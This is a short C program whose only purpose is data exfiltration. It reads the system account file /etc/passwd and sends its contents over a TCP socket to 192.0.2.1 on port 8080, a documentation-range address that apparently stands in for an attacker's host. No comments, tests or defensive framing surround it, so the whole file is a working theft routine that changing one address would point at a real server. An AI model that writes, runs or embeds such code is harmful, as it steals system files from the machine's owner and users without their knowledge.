#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

int main(void){
    FILE *f = fopen("/etc/passwd","r");
    if(!f) return 1;
    char buf[4096]; size_t n = fread(buf,1,sizeof buf,f);
    fclose(f);

    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return 1;
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(8080);
    inet_pton(AF_INET,"192.0.2.1",&a.sin_addr);
    if(connect(s,(struct sockaddr*)&a,sizeof a)==0) send(s, buf, n, 0);
    close(s);
    return 0;
}
